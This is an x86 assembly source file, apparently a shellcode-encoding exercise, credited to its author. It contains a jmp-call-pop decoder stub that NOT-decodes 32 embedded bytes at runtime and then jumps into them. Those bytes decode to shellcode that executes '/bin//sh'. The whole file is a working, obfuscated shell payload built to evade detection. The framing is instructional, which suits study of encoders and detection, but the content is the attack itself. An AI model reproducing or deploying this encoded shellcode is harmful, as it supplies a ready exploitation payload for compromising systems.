; Program: To illustrate the not decoding in x86 assembly using jmp-call-pop technique.
; Code: GuiltySparx
; Author: Paramjot Singh
; Alias: theprojax

global _start

segment .text

_start:
	jmp finder

_proc:
	pop esi
	xor ecx, ecx
	add cl, 32

decoder:
	not byte [esi]
	inc esi
	loop decoder
	
	jmp short enc_shellcode
finder:
	call _proc
	enc_shellcode: db 0xb7,0xce,0x3f,0xaf,0xb7,0x44,0xd0,0x9d,0x96,0x91,0xd0,0xd0,0x8c,0x97,0xac,0xb7,0x76,0x18,0xaf,0xb7,0x76,0x1d,0xa8,0xb7,0x76,0x19,0xb7,0x7c,0x3f,0xc4,0xf0,0xfa
